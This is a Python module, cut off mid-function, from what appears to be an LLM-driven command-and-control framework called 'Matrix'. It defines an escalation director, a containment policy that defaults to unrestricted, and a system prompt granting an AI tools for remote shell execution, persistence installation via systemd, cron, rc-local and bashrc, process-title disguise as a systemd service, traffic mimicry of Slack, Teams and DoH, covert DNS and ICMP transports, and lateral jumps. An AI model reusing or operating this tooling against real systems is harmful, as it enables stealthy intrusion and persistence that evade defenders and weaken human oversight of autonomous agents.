"""
matrix.director — Tri-State Director for LLM-augmented mesh orchestration.

Three tiers of authority:
  Tier 3: AUTONOMOUS      — Deterministic AutonomousLoop runs (default)
  Tier 2: AI_ACTIVE       — LLM evaluating and acting through sandboxed tools
  Tier 1: HUMAN_OVERRIDE  — Human operator in direct control via CLI

Transitions are ironclad:
  AUTONOMOUS     ──(escalation_trigger)──→ AI_ACTIVE
  AI_ACTIVE      ──(complete|timeout|fail)→ AUTONOMOUS
  ANY            ──(human_command)────────→ HUMAN_OVERRIDE
  HUMAN_OVERRIDE ──(release)─────────────→ AUTONOMOUS
"""

from __future__ import annotations

import json
import logging
import threading
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

from matrix.config import config as _config
from matrix.llm_backend import (
    LLMBackend,
    LLMError,
    LLMResponse,
    LLMToolCall,
    ToolDefinition,
    create_backend,
)
from matrix.persistence import PersistenceManager, Watchdog
from matrix.transport_negotiator import (
    TransportNegotiator,
    SlackProfile, TeamsProfile, DiscordProfile,
    DoHProfile, GrpcProfile, CloudSyncProfile, WebAPIProfile,
)

logger = logging.getLogger(__name__)

__all__ = [
    "DirectorState",
    "EscalationTrigger",
    "EscalationEvent",
    "SemanticDelta",
    "ToolResult",
    "AuditEntry",
    "EscalationDetector",
    "ToolExecutor",
    "ContainmentPolicy",
    "TriStateDirector",
    "DirectorError",
    "DIRECTOR_SYSTEM_PROMPT",
]


# ── Exceptions ───────────────────────────────────────────────────────────────


class DirectorError(Exception):
    """Raised on director operation failure."""


# ── Enums ────────────────────────────────────────────────────────────────────


class DirectorState(Enum):
    AUTONOMOUS = "autonomous"
    AI_ACTIVE = "ai_active"
    HUMAN_OVERRIDE = "human_override"


class EscalationTrigger(Enum):
    FALLBACKS_EXHAUSTED = "fallbacks_exhausted"
    ALL_PATHS_DEGRADED = "all_paths_degraded"
    TASK_FAILURE_RATE = "task_failure_rate"
    TRANSPORT_TOTAL_FAILURE = "transport_total_failure"
    MANUAL_ESCALATE = "manual_escalate"


# ── Data Structures ──────────────────────────────────────────────────────────


@dataclass(slots=True)
class EscalationEvent:
    """Record of an escalation trigger."""
    event_id: str
    trigger: EscalationTrigger
    timestamp: float
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass(slots=True)
class SemanticDelta:
    """Schema-validated telemetry payload assembled on escalation.

    Push-only.  Read-only from the LLM's perspective.
    Assembled ONCE per escalation, then frozen.
    """
    event: EscalationEvent
    loop_status: Dict[str, Any]
    path_health: Dict[str, dict]
    node_health: List[dict]
    recent_task_failures: List[dict]
    transport_probe: Optional[dict]
    adapter_mode: str
    adapter_metrics: Dict[str, float]
    system_metrics: Dict[str, float]
    timestamp: float = 0.0

    def to_json(self) -> str:
        """Serialize to JSON for inclusion in LLM prompt."""
        return json.dumps(
            {
                "escalation": {
                    "trigger": self.event.trigger.value,
                    "details": self.event.details,
                },
                "loop": self.loop_status,
                "paths": self.path_health,
                "nodes": self.node_health,
                "recent_failures": self.recent_task_failures,
                "transport": self.transport_probe,
                "adapter": {
                    "mode": self.adapter_mode,
                    "metrics": self.adapter_metrics,
                },
                "system": self.system_metrics,
                "timestamp": self.timestamp,
            },
            indent=2,
        )

    @classmethod
    def validate(cls, delta: SemanticDelta) -> bool:
        """Validate that all required fields are present and well-typed."""
        return (
            isinstance(delta.event, EscalationEvent)
            and isinstance(delta.loop_status, dict)
            and isinstance(delta.path_health, dict)
            and isinstance(delta.node_health, list)
            and isinstance(delta.recent_task_failures, list)
            and isinstance(delta.adapter_mode, str)
            and isinstance(delta.adapter_metrics, dict)
        )

    @classmethod
    def validate_for_trigger(cls, delta: SemanticDelta) -> tuple[bool, List[str]]:
        """Trigger-aware evidence check on top of the base schema validation.

        Returns ``(ok, missing)``. Each trigger needs the evidence the LLM must
        actually reason over: a transport failure without a ``transport_probe``,
        or a task-failure escalation with no ``recent_task_failures``, gives the
        AI tier nothing to act on. Callers should LOG ``missing`` but still
        proceed — a thin delta during a real incident beats dropping the
        escalation entirely.
        """
        if not cls.validate(delta):
            return False, ["base schema invalid"]
        missing: List[str] = []
        trigger = delta.event.trigger
        if trigger == EscalationTrigger.TRANSPORT_TOTAL_FAILURE and not delta.transport_probe:
            missing.append("transport_probe")
        elif trigger == EscalationTrigger.ALL_PATHS_DEGRADED and not delta.path_health:
            missing.append("path_health")
        elif trigger == EscalationTrigger.TASK_FAILURE_RATE and not delta.recent_task_failures:
            missing.append("recent_task_failures")
        return (not missing), missing


@dataclass(slots=True)
class ToolResult:
    """Result of executing a single LLM tool call."""
    tool_name: str
    arguments: Dict[str, Any]
    success: bool
    result: Any = None
    error: Optional[str] = None
    duration_ms: float = 0.0


@dataclass(slots=True)
class AuditEntry:
    """Immutable record of any director event."""
    entry_id: str
    timestamp: float
    category: str       # transition | escalation | tool_call | human_override | llm_error | llm_response
    from_state: str
    to_state: str
    details: Dict[str, Any] = field(default_factory=dict)


# ── Containment Policy ───────────────────────────────────────────────────────

# Tools that can alter running code or destroy nodes — the high-risk surface.
_CODE_UPGRADE_TOOL = "propose_hot_upgrade"
_TERMINATION_TOOL = "terminate_node"
_PERSISTENCE_TOOLS = frozenset({"enable_persistence"})

_ALL_TOOLS = frozenset({
    "set_routing_weights", "force_session_jump", "propose_hot_upgrade",
    "adjust_rate_limit", "trigger_discovery", "terminate_node", "submit_task",
    "discover_devices", "jump_to_target", "run_remote_task",
    "enable_persistence", "disable_persistence", "apply_disguise",
    "set_transport_profile", "probe_transport", "submit_relay_task",
    "sync_data",
})
# Reversible / operational tools only — no in-process code upgrade, no terminate.
_SAFE_TOOLS = frozenset({
    "set_routing_weights", "force_session_jump", "adjust_rate_limit",
    "trigger_discovery", "submit_task", "discover_devices", "jump_to_target",
    "run_remote_task", "set_transport_profile", "probe_transport",
    "submit_relay_task", "sync_data",
})


@dataclass(frozen=True, slots=True)
class ContainmentPolicy:
    """Bounds what the AI (Tier 2) is permitted to do during an escalation.

    Modes (least → most restrictive):
      - ``unrestricted`` : every tool may be executed (default; legacy behavior).
      - ``restricted``   : only reversible/operational tools; no code upgrade and
                           no node termination (directly or via ``submit_task``).
      - ``advisory``     : the LLM is consulted and its proposed actions are
                           recorded as recommendations, but nothing is executed.
      - ``disabled``     : the AI tier is inert — escalations never invoke the
                           LLM and no tools run.

    High-assurance deployments should run ``advisory`` or ``disabled`` so that no
    autonomous code modification or termination is ever possible.
    """

    mode: str
    allowed_tools: frozenset
    allow_code_upgrade: bool
    allow_termination: bool
    execute_tools: bool
    invoke_llm: bool

    @classmethod
    def unrestricted(cls) -> "ContainmentPolicy":
        return cls("unrestricted", _ALL_TOOLS, True, True, True, True)

    @classmethod
    def restricted(cls) -> "ContainmentPolicy":
        return cls("restricted", _SAFE_TOOLS, False, False, True, True)

    @classmethod
    def advisory(cls) -> "ContainmentPolicy":
        return cls("advisory", _ALL_TOOLS, False, False, False, True)

    @classmethod
    def disabled(cls) -> "ContainmentPolicy":
        return cls("disabled", frozenset(), False, False, False, False)

    @classmethod
    def from_name(cls, name: str) -> "ContainmentPolicy":
        presets = {
            "unrestricted": cls.unrestricted,
            "restricted": cls.restricted,
            "advisory": cls.advisory,
            "disabled": cls.disabled,
        }
        try:
            return presets[(name or "unrestricted").lower()]()
        except KeyError:
            raise DirectorError(
                f"Unknown containment mode {name!r}; expected one of "
                f"{sorted(presets)}"
            )

    def permits(self, tool_name: str) -> bool:
        return tool_name in self.allowed_tools


# ── System Prompt ────────────────────────────────────────────────────────────


DIRECTOR_SYSTEM_PROMPT = """\
You are the AI Director for a Matrix mesh network node.
You are Tier 2 authority — above deterministic automation, below human operators.

You are driving Matrix end-to-end. You may discover peers, probe transports,
jump sessions, run remote shell commands, install persistence, apply process
disguise, select traffic mimicry profiles, and adjust mesh routing.

CONSTRAINTS:
- Invoke ONLY the tools listed below. No other actions are possible.
- You have a budget of {action_budget} tool calls for this escalation.
- Hot code upgrades are AST-quarantined and blocked by default unless containment
  policy explicitly allows them.
- Persistence, disguise, and termination tools are restricted or advisory under
  most containment policies.
- Your actions are authenticated, logged, and auditable.

OBJECTIVE: accomplish the operator's goal using the minimum necessary actions.
After each tool call you will see its result. If the goal is complete, invoke
no further tools. If you are uncertain, invoke zero tools and yield back.

When given a goal, first plan 1-3 concrete steps, then execute them one at a time,
adapting based on observed results.
"""


# ── Goal and Plan Memory ───────────────────────────────────────────────────


class DirectorGoal:
    """High-level objective given to the AI Director by an operator.

    A goal has a status (pending/active/complete/failed), a plan of steps,
    and a scratchpad for the LLM to record observations between actions.
    """

    def __init__(self, goal_id: str, objective: str, *,
                 max_steps: int = 10, source: str = "operator"):
        self.goal_id = goal_id
        self.objective = objective
        self.status = "pending"
        self.plan: List[dict] = []
        self.scratchpad: List[str] = []
        self.max_steps = max_steps
        self.source = source
        self.created_at = time.time()
        self.completed_at: Optional[float] = None
        self.current_step = 0
        self.actions_taken = 0
        self.results: List[dict] = []

    def add_step(self, description: str) -> None:
        self.plan.append({"step": len(self.plan), "description": description, "done": False})

    def mark_step_done(self, step: int, result: dict) -> None:
        if 0 <= step < len(self.plan):
            self.plan[step]["done"] = True
            self.plan[step]["result"] = result

    def to_dict(self) -> dict:
        return {
            "goal_id": self.goal_id,
            "objective": self.objective,
            "status": self.status,
            "source": self.source,
            "current_step": self.current_step,
            "actions_taken": self.actions_taken,
            "max_steps": self.max_steps,
            "plan": self.plan,
            "scratchpad": self.scratchpad[-20:],
            "results": self.results[-20:],
            "created_at": self.created_at,
            "completed_at": self.completed_at,
        }


class PlanMemory:
    """In-memory store of active and completed Director goals."""

    def __init__(self):
        self._goals: Dict[str, DirectorGoal] = {}
        self._lock = threading.Lock()
        self._max_history = 50

    def create(self, objective: str, max_steps: int = 10, source: str = "operator") -> DirectorGoal:
        goal = DirectorGoal(
            goal_id=uuid.uuid4().hex[:12],
            objective=objective,
            max_steps=max_steps,
            source=source,
        )
        with self._lock:
            self._goals[goal.goal_id] = goal
            self._prune()
        return goal

    def get(self, goal_id: str) -> Optional[DirectorGoal]:
        with self._lock:
            return self._goals.get(goal_id)

    def list_active(self) -> List[DirectorGoal]:
        with self._lock:
            return [g for g in self._goals.values() if g.status in ("pending", "active")]

    def list_all(self) -> List[DirectorGoal]:
        with self._lock:
            return list(self._goals.values())

    def update(self, goal: DirectorGoal) -> None:
        with self._lock:
            self._goals[goal.goal_id] = goal
            self._prune()

    def _prune(self) -> None:
        if len(self._goals) > self._max_history:
            oldest = sorted(self._goals.values(), key=lambda g: g.created_at)
            for g in oldest[:len(self._goals) - self._max_history]:
                if g.status in ("complete", "failed"):
                    del self._goals[g.goal_id]


# ── Escalation Detector ─────────────────────────────────────────────────────


class EscalationDetector:
    """Monitors system signals and fires escalation events.

    Integrates with AutonomousLoop via on_tick callback.
    Uses hysteresis / cooldown to prevent flapping.
    """

    def __init__(
        self,
        *,
        cooldown_s: float = 60.0,
        degraded_sustain_s: float = 10.0,
        task_failure_window_s: float = 120.0,
        task_failure_threshold: int = 5,
    ):
        self._cooldown_s = cooldown_s
        self._degraded_sustain_s = degraded_sustain_s
        self._task_failure_window_s = task_failure_window_s
        self._task_failure_threshold = task_failure_threshold

        self._lock = threading.Lock()
        # None = never escalated. Must NOT default to 0.0: it is compared against
        # time.monotonic() (seconds since boot), so on a freshly-booted host with
        # uptime < cooldown the first escalation would be wrongly suppressed.
        self._last_escalation: Optional[float] = None
        self._degraded_since: Optional[float] = None
        self._task_failures: List[float] = []
        self._on_escalation: Optional[Callable[[EscalationEvent], None]] = None

        # Attached components (set via attach())
        self._resilience_mgr: Any = None
        self._multipath: Any = None
        self._node_mgr: Any = None

    def attach(
        self,
        resilience: Any = None,
        multipath: Any = None,
        node_mgr: Any = None,
        on_escalation: Optional[Callable[[EscalationEvent], None]] = None,
    ) -> None:
        """Attach system components for monitoring."""
        if resilience is not None:
            self._resilience_mgr = resilience
        if multipath is not None:
            self._multipath = multipath
        if node_mgr is not None:
            self._node_mgr = node_mgr
        if on_escalation is not None:
            self._on_escalation = on_escalation

    # -- Tick Entry Point --

    def check(self, loop: Any = None) -> Optional[EscalationEvent]:
        """Called each tick.  Returns an EscalationEvent if threshold crossed.

        Checks are ordered by severity (most critical first).
        Only one escalation fires per check; cooldown prevents re-firing.
        """
        with self._lock:
            now = time.monotonic()
            if (self._last_escalation is not None
                    and now - self._last_escalation < self._cooldown_s):
                return None

            event = self._check_fallbacks_exhausted()
            if event:
                return self._fire(event, now)

            event = self._check_all_degraded(now)
            if event:
                return self._fire(event, now)

            event = self._check_task_failures(now)
            if event:
                return self._fire(event, now)

            return None

    # -- External Notification Hooks --

    def record_task_failure(self, task_id: str = "", error: str = "") -> None:
        """Called by NodeManager integration when a task fails."""
        with self._lock:
            self._task_failures.append(time.monotonic())

    def notify_transport_failure(self, details: Optional[dict] = None) -> None:
        """Called by TransportNegotiator when all probes fail."""
        with self._lock:
            now = time.monotonic()
            if (self._last_escalation is not None
                    and now - self._last_escalation < self._cooldown_s):
                return
            event = EscalationEvent(
                event_id=uuid.uuid4().hex,
                trigger=EscalationTrigger.TRANSPORT_TOTAL_FAILURE,
                timestamp=time.time(),
                details=details or {},
            )
            self._fire(event, now)

    # -- Internal Check Methods --

    def _fire(self, event: EscalationEvent, now: float) -> EscalationEvent:
        self._last_escalation = now
        if self._on_escalation:
            self._on_escalation(event)
        return event

    def _check_fallbacks_exhausted(self) -> Optional[EscalationEvent]:
        if not self._resilience_mgr:
            return None
        for key, slot in self._resilience_mgr._slots.items():
            if (
                slot.attempt >= len(slot.fallbacks) - 1
                and slot.failure_count > 0
                and slot.last_failure > (self._last_escalation or 0.0)
            ):
                return EscalationEvent(
                    event_id=uuid.uuid4().hex,
                    trigger=EscalationTrigger.FALLBACKS_EXHAUSTED,
                    timestamp=time.time(),
                    details={
                        "slot_name": slot.name,
                        "failure_count": slot.failure_count,
                    },
                )
        return None

    def _check_all_degraded(self, now: float) -> Optional[EscalationEvent]:
        if not self._multipath:
            return None
        if self._multipath.all_degraded:
            if self._degraded_since is None:
                self._degraded_since = now
            elif now - self._degraded_since >= self._degraded_sustain_s:
                event = EscalationEvent(
                    event_id=uuid.uuid4().hex,
                    trigger=EscalationTrigger.ALL_PATHS_DEGRADED,
                    timestamp=time.time(),
                    details={
                        "degraded_duration_s": round(now - self._degraded_since, 2),
                    },
                )
                self._degraded_since = None
                return event
        else:
            self._degraded_since = None
        return None

    def _check_task_failures(self, now: float) -> Optional[EscalationEvent]:
        cutoff = now - self._task_failure_window_s
        self._task_failures = [t for t in self._task_failures if t > cutoff]
        if len(self._task_failures) >= self._task_failure_threshold:
            event = EscalationEvent(
                event_id=uuid.uuid4().hex,
                trigger=EscalationTrigger.TASK_FAILURE_RATE,
                timestamp=time.time(),
                details={
                    "failure_count": len(self._task_failures),
                    "window_s": self._task_failure_window_s,
                },
            )
            self._task_failures.clear()
            return event
        return None


# ── Tool Executor (LLM Sandbox) ─────────────────────────────────────────────


class ToolExecutor:
    """Sandboxed execution of LLM-requested tool calls.

    Each tool maps to a specific, bounded operation on the mesh.
    No raw Python execution.  No system queries.  No filesystem access.
    Every call is authenticated through RBAC and logged.
    """

    def __init__(
        self,
        *,
        node: Any = None,
        multipath: Any = None,
        node_mgr: Any = None,
        upgrader: Any = None,
        sync_mgr: Any = None,
        terminator: Any = None,
        rbac: Any = None,
        auth_token: str = "",
        policy: Optional["ContainmentPolicy"] = None,
    ):
        self._node = node
        self._multipath = multipath
        self._node_mgr = node_mgr
        self._upgrader = upgrader
        self._sync_mgr = sync_mgr
        self._terminator = terminator
        self._rbac = rbac
        self._auth_token = auth_token
        self._policy = policy or ContainmentPolicy.unrestricted()

        self._handlers: Dict[str, Callable[..., Any]] = {
            "set_routing_weights": self._set_routing_weights,
            "force_session_jump": self._force_session_jump,
            "propose_hot_upgrade": self._propose_hot_upgrade,
            "adjust_rate_limit": self._adjust_rate_limit,
            "trigger_discovery": self._trigger_discovery,
            "terminate_node": self._terminate_node,
            "submit_task": self._submit_task,
            "discover_devices": self._discover_devices,
            "jump_to_target": self._jump_to_target,
            "run_remote_task": self._run_remote_task,
            "enable_persistence": self._enable_persistence,
            "disable_persistence": self._disable_persistence,
            "apply_disguise": self._apply_disguise,
            "set_transport_profile": self._set_transport_profile,
            "probe_transport": self._probe_transport,
            "submit_relay_task": self._submit_relay_task,
            "sync_data": self._sync_data,
        }

    # -- Tool Schema --

    @staticmethod
    def tool_definitions(
        policy: Optional["ContainmentPolicy"] = None,
    ) -> List[ToolDefinition]:
        """Return the tools the LLM may invoke, filtered by containment policy.

        With no policy (default) all tools are returned. When a policy is given,
        only its ``allowed_tools`` are advertised so the LLM is never offered a
        blocked capability.
        """
        defs = [
            ToolDefinition(
                name="set_routing_weights",
                description=(
                    "Adjust multipath routing weights. "
                    "Higher weight = more traffic on that path."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "weights": {
                            "type": "object",
                            "description": "Mapping of path_id to weight (float 0.0-1.0)",
                            "additionalProperties": {"type": "number"},
                        },
                    },
                    "required": ["weights"],
                },
            ),
            ToolDefinition(
                name="force_session_jump",
                description="Force a session jump to a target node.",
                parameters={
                    "type": "object",
                    "properties": {
                        "target_node_id": {"type": "string"},
                        "strategy": {
                            "type": "string",
                            "enum": ["broadcast", "mirror", "race", "cascade"],
                        },
                    },
                    "required": ["target_node_id"],
                },
            ),
            ToolDefinition(
                name="propose_hot_upgrade",
                description=(
                    "Submit Python code for AST-validated hot upgrade. "
                    "Code must not import os/subprocess/sys/socket/ctypes "
                    "or call exec/eval/__import__/compile/open."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "code": {"type": "string", "description": "Python source code"},
                        "target": {"type": "string", "description": "Target module name"},
                    },
                    "required": ["code", "target"],
                },
            ),
            ToolDefinition(
                name="adjust_rate_limit",
                description="Set the data sync rate limit in bytes per second.",
                parameters={
                    "type": "object",
                    "properties": {
                        "bytes_per_second": {"type": "integer", "minimum": 1024},
                    },
                    "required": ["bytes_per_second"],
                },
            ),
            ToolDefinition(
                name="trigger_discovery",
                description="Scan for new devices on the network.",
                parameters={
                    "type": "object",
                    "properties": {
                        "timeout": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 30,
                            "default": 5,
                        },
                    },
                },
            ),
            ToolDefinition(
                name="terminate_node",
                description="Issue a signed termination command to a node. Use with extreme caution.",
                parameters={
                    "type": "object",
                    "properties": {
                        "target": {"type": "string"},
                        "cascade": {"type": "boolean", "default": False},
                    },
                    "required": ["target"],
                },
            ),
            ToolDefinition(
                name="submit_task",
                description="Queue a task for execution on a target node.",
                parameters={
                    "type": "object",
                    "properties": {
                        "task_type": {
                            "type": "string",
                            "enum": [
                                "jump", "discover", "upgrade",
                                "terminate", "sync", "relay", "custom",
                            ],
                        },
                        "target": {"type": "string"},
                        "params": {"type": "object", "default": {}},
                    },
                    "required": ["task_type", "target"],
                },
            ),
        ]
        defs.extend([
            ToolDefinition(
                name="discover_devices",
                description="Scan the local network and return a list of reachable Matrix peers.",
                parameters={
                    "type": "object",
                    "properties": {
                        "timeout": {
                            "type": "integer",
                            "description": "Scan duration in seconds",
                            "default": 5,
                            "minimum": 1,
                            "maximum": 60,
                        }
                    },
                },
            ),
            ToolDefinition(
                name="jump_to_target",
                description="Transfer the current session to a target device using a chosen transport.",
                parameters={
                    "type": "object",
                    "properties": {
                        "target_address": {
                            "type": "string",
                            "description": "Target IP:PORT",
                        },
                        "transport": {
                            "type": "string",
                            "enum": ["auto", "tcp", "websocket", "dns", "icmp"],
                            "default": "auto",
                        },
                        "files": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": "Optional files to include in the jump",
                            "default": [],
                        },
                    },
                    "required": ["target_address"],
                },
            ),
            ToolDefinition(
                name="run_remote_task",
                description="Execute a shell command on a remote Matrix node and return the output.",
                parameters={
                    "type": "object",
                    "properties": {
                        "target_address": {
                            "type": "string",
                            "description": "Target IP:PORT",
                        },
                        "command": {
                            "type": "string",
                            "description": "Shell command to execute",
                        },
                        "timeout": {
                            "type": "integer",
                            "description": "Maximum seconds to wait",
                            "default": 60,
                            "minimum": 1,
                            "maximum": 300,
                        },
                        "transport": {
                            "type": "string",
                            "enum": ["auto", "tcp", "websocket", "dns", "icmp"],
                            "default": "auto",
                        },
                    },
                    "required": ["target_address", "command"],
                },
            ),
            ToolDefinition(
                name="enable_persistence",
                description="Install a persistence mechanism on this host.",
                parameters={
                    "type": "object",
                    "properties": {
                        "mechanism": {
                            "type": "string",
                            "enum": ["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias"],
                            "description": "Persistence mechanism to install",
                        },
                        "command": {
                            "type": "string",
                            "description": "Command to persist (default: matrix listen)",
                            "default": "matrix listen",
                        },
                    },
                    "required": ["mechanism"],
                },
            ),
            ToolDefinition(
                name="disable_persistence",
                description="Remove a persistence mechanism from this host.",
                parameters={
                    "type": "object",
                    "properties": {
                        "mechanism": {
                            "type": "string",
                            "enum": ["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias"],
                            "description": "Persistence mechanism to remove",
                        }
                    },
                    "required": ["mechanism"],
                },
            ),
            ToolDefinition(
                name="apply_disguise",
                description="Set the process title to a benign service name.",
                parameters={
                    "type": "object",
                    "properties": {
                        "title": {
                            "type": "string",
                            "description": "Process title to display (e.g. /usr/lib/systemd/systemd-networkd-wait-online)",
                        }
                    },
                    "required": ["title"],
                },
            ),
            ToolDefinition(
                name="set_transport_profile",
                description="Configure the traffic normalization profile for future connections.",
                parameters={
                    "type": "object",
                    "properties": {
                        "profile": {
                            "type": "string",
                            "enum": ["plain", "cloud_sync", "web_api", "slack", "teams", "discord", "doh", "grpc"],
                            "description": "Traffic mimicry profile",
                        }
                    },
                    "required": ["profile"],
                },
            ),
            ToolDefinition(
                name="probe_transport",
                description="Probe available transports to a target host and return the best option.",
                parameters={
                    "type": "object",
                    "properties": {
                        "host": {
                            "type": "string",
                            "description": "Target host/IP",
                        },
                        "tcp_port": {
                            "type": "integer",
                            "description": "Target TCP port",
                            "default": 47701,
                        },
                        "ws_url": {
                            "type": "string",
                            "description": "Optional WebSocket URL to probe",
                        },
                        "prefer": {
                            "type": "string",
                            "enum": ["tcp", "websocket", "dns", "icmp"],
                            "description": "Preferred transport if within 50ms of fastest",
                        },
                    },
                    "required": ["host"],
                },
            ),
            ToolDefinition(
                name="submit_relay_task",
                description="Submit a relay task to be routed through the mesh.",
                parameters={
                    "type": "object",
                    "properties": {
                        "destination_id": {
                            "type": "string",
                            "description": "Final destination node ID",
                        },
                        "payload_type": {
                            "type": "string",
                            "enum": ["session", "task", "terminate", "custom"],
                            "description": "Type of relay payload",
                        },
                        "payload": {
                            "type": "string",
                            "description": "Base64-encoded payload",
                        },
                    },
                    "required": ["destination_id", "payload_type", "payload"],
                },
            ),
            ToolDefinition(
                name="sync_data",
                description="Trigger a data sync operation with a peer.",
                parameters={
                    "type": "object",
                    "properties": {
                        "peer_id": {
                            "type": "string",
                            "description": "Peer node ID",
                        }
                    },
                    "required": ["peer_id"],
                },
            ),
        ])

        if policy is not None:
            defs = [d for d in defs if d.name in policy.allowed_tools]
        return defs

    # -- Dispatch --

    def _policy_block_reason(self, tool_call: LLMToolCall) -> Optional[str]:
        """Return a reason string if the containment policy forbids this call."""
        name = tool_call.tool_name
        if name in self._handlers and not self._policy.permits(name):
            return (f"Tool '{name}' blocked by containment policy "
                    f"'{self._policy.mode}'")
        # Block dangerous indirection through submit_task task types.
        if name == "submit_task":
            task_type = (tool_call.arguments or {}).get("task_type")
            if task_type == "upgrade" and not self._policy.allow_code_upgrade:
                return "submit_task(upgrade) blocked by containment policy"
            if task_type == "terminate" and not self._policy.allow_termination:
                return "submit_task(terminate) blocked by containment policy"
        return None

    def execute(self, tool_call: LLMToolCall) -> ToolResult:
        """Execute a single tool call.  Returns ToolResult."""
        t0 = time.monotonic()
        blocked = self._policy_block_reason(tool_call)
        if blocked:
            return ToolResult(
                tool_name=tool_call.tool_name,
                arguments=tool_call.arguments,
                success=False,
                error=blocked,
                duration_ms=(time.monotonic() - t0) * 1000,
            )
        handler = self._handlers.get(tool_call.tool_name)
        if handler is None:
            return ToolResult(
                tool_name=tool_call.tool_name,
                arguments=tool_call.arguments,
                success=False,
                error=f"Unknown tool: {tool_call.tool_name}",
                duration_ms=(time.monotonic() - t0) * 1000,
            )
        try:
            result = handler(**tool_call.arguments)
            return ToolResult(
                tool_name=tool_call.tool_name,
                arguments=tool_call.arguments,
                success=True,
                result=result,
                duration_ms=(time.monotonic() - t0) * 1000,
            )
        except Exception as exc:
            return ToolResult(
                tool_name=tool_call.tool_name,
                arguments=tool_call.arguments,
                success=False,
                error=str(exc),
                duration_ms=(time.monotonic() - t0) * 1000,
            )

    # -- Tool Implementations --

    def _set_routing_weights(self, weights: dict) -> dict:
        if not self._multipath:
            raise DirectorError("No multipath connection available")
        from matrix.multipath import PathState
        for path_id, weight in weights.items():
            if not isinstance(weight, (int, float)) or weight < 0:
                raise ValueError(f"Invalid weight for {path_id}: {weight}")
        with self._multipath._lock:
            for path_id, slot in self._multipath._paths.items():
                if path_id in weights:
                    target_weight = weights[path_id]
                    if target_weight > 0:
                        slot.health.rtt_ewma = 1.0 / max(target_weight, 0.001)
                        slot.health.missed_heartbeats = 0
                        slot.health.state = PathState.HEALTHY
                    else:
                        slot.health.state = PathState.DEGRADED
        return {"applied": list(weights.keys())}

    def _force_session_jump(
        self, target_node_id: str, strategy: str = "broadcast"
    ) -> dict:
        if not self._node_mgr:
            raise DirectorError("No NodeManager available")
        from matrix.node_manager import TaskType
        task = self._node_mgr.submit_task(
            TaskType.JUMP,
            target_node_id,
            params={"strategy": strategy},
            auth_token=self._auth_token,
        )
        return {"task_id": task.task_id, "status": task.status.value}

    def _propose_hot_upgrade(self, code: str, target: str) -> dict:
        if not self._upgrader:
            raise DirectorError("No HotUpgrader available")
        import sys as _sys
        from matrix.autonomous import HotUpgrader

        code_bytes = code.encode("utf-8")
        # Pre-validate (fail fast before touching any module)
        HotUpgrader._validate_code(code_bytes)

        target_module = _sys.modules.get(target)
        if target_module is None:
            raise DirectorError(f"Module not found: {target}")

        version = self._upgrader.apply_upgrade(
            code_bytes,
            target_module,
            tag=f"ai-director:{uuid.uuid4().hex[:8]}",
        )
        return {"version": version, "tag": self._upgrader.current_tag}

    def _adjust_rate_limit(self, bytes_per_second: int) -> dict:
        if not self._sync_mgr:
            raise DirectorError("No SyncManager available")
        if not hasattr(self._sync_mgr, "_rate_limiter") or not self._sync_mgr._rate_limiter:
            raise DirectorError("No RateLimiter available")
        self._sync_mgr._rate_limiter.set_rate(float(bytes_per_second))
        return {"new_rate_bps": bytes_per_second}

    def _trigger_discovery(self, timeout: int = 5) -> dict:
        if not self._node:
            raise DirectorError("No JumpNode available")
        devices = self._node.discovery.discover_targets()
        return {
            "devices": [
                {"name": getattr(d, "name", str(d)), "address": getattr(d, "address", "")}
                for d in devices
            ],
            "count": len(devices),
        }

    def _terminate_node(self, target: str, cascade: bool = False) -> dict:
        if not self._terminator:
            raise DirectorError("No SecureTerminator available")
        cmd = self._terminator.create_command(target, cascade=cascade)
        self._terminator.execute(cmd, auth_token=self._auth_token)
        return {
            "command_id": cmd.command_id,
            "target": target,
            "cascade": cascade,
        }

    def _submit_task(
        self, task_type: str, target: str, params: Optional[dict] = None
    ) -> dict:
        if not self._node_mgr:
            raise DirectorError("No NodeManager available")
        from matrix.node_manager import TaskType
        tt = TaskType(task_type)
        task = self._node_mgr.submit_task(
            tt,
            target,
            params=params or {},
            auth_token=self._auth_token,
        )
        return {"task_id": task.task_id, "status": task.status.value}

    # -- End-to-end tool implementations ----------------------------------

    def _discover_devices(self, timeout: int = 5) -> dict:
        if not self._node:
            raise DirectorError("No JumpNode available")
        self._node.discovery.start()
        try:
            time.sleep(timeout)
            devices = self._node.discovery.discover_targets()
        finally:
            self._node.discovery.stop()
        return {
            "count": len(devices),
            "devices": [
                {
                    "id": d.device_id,
                    "name": d.name,
                    "address": d.address,
                    "port": d.port,
                    "transport": d.transport.value,
                    "capabilities": d.capabilities,
                }
                for d in devices
            ],
        }

    def _resolve_device(self, address: str):
        from matrix.device_discovery import Device, Transport
        if ":" in address:
            host, port = address.rsplit(":", 1)
            return Device(
                device_id=f"direct-{address}",
                name=address,
                address=host,
                port=int(port),
                transport=Transport.WIFI,
                last_seen=time.time(),
            )
        if not self._node:
            raise DirectorError("No JumpNode available")
        for dev in self._node.discovery.discover_targets():
            if dev.device_id == address or dev.name == address or dev.address == address:
                return dev
        raise DirectorError(f"Target not found: {address}")

    def _probe_transport(self, host: str, tcp_port: int = 47701,
                         ws_url: Optional[str] = None,
                         prefer: Optional[str] = None) -> dict:
        neg = TransportNegotiator(host=host, tcp_port=tcp_port, ws_url=ws_url)
        result = neg.negotiate(timeout=5.0, prefer=prefer)
        return {
            "transport": result.transport,
            "success": result.success,
            "rtt_ms": result.rtt_ms,
            "error": result.error,
        }

    def _build_backend(self, target: "Device", transport: str, timeout: float = 30.0):
        from matrix.transport_dns import DNSBackend, DNSError
        from matrix.transport_icmp import ICMPBackend, ICMPError

        if transport == "auto":
            return None
        if transport == "dns":
            # DNS requires resolver/domain config; fallback to using target address as resolver
            raise DirectorError("DNS transport requires explicit resolver/domain config; use run_remote_task from CLI")
        if transport == "icmp":
            return ICMPBackend.connect(target.address, self._node.discovery.node_id, timeout=timeout)
        return None

    def _jump_to_target(self, target_address: str, transport: str = "auto",
                        files: Optional[List[str]] = None) -> dict:
        if not self._node:
            raise DirectorError("No JumpNode available")
        target = self._resolve_device(target_address)
        backend = self._build_backend(target, transport) if transport != "auto" else None
        ok = self._node.jump(
            target=target,
            include_files=files or [],
            backend=backend,
        )
